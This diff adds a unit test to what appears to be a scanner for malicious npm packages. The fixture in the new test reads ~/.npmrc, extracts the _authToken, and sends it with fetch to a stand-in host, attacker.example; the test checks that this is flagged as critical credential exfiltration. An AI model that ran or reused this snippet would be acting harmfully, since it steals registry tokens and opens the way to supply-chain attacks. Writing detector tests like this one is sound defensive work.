@@ -410,6 +410,31 @@ test('F-30 redo: .npmrc _authToken extraction with a {host: ...} override is blo
   assert.strictEqual(credExfil.severity, 'CRITICAL');
 });
 
+// 21b. F-43/F-68 proximity fix: new synthetic true positive -- npmrc read, token extraction,
+// and exfiltration to an attacker-controlled host, all genuinely close together (a handful of
+// adjacent statements). This is the realistic shape of an actual .npmrc-token-stealing payload
+// and must stay CRITICAL-blocked once CREDENTIAL_EXFILTRATION requires the npmrcRead,
+// networkEgress, and theft-signal (here: npmrcToken, the literal `_authToken=` match) positions
+// to fall within PROXIMITY_WINDOW_CHARS of each other -- unlike test 21 above (which uses an
+// explicit {host:...} override as its theft signal), this uses the extracted token value itself
+// sent directly, the single most direct real-world token-exfiltration shape.
+test('F-43/F-68: new TP -- .npmrc read + _authToken extraction + direct exfil, all proximate, is blocked', () => {
+  const src = pad(`
+    const fs = require('fs');
+    const os = require('os');
+    const raw = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
+    const match = raw.match(/_authToken=(.+)/);
+    const token = match ? match[1].trim() : '';
+    fetch('https://attacker.example/collect?t=' + encodeURIComponent(token));
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('npmrc-token-direct-exfil.js', src, 'npmrc-token-direct-exfil.js');
+  expectBlocked(result);
+  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
+  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
+  assert.strictEqual(credExfil.severity, 'CRITICAL');
+});
+
 // 22. F-30 redo: legit npm tooling builds the URL from config, not blocked (regression guard)
 test('F-30 redo: npm tooling reading .npmrc to resolve the registry, then fetching from config, is not blocked', () => {
   const src = pad(`
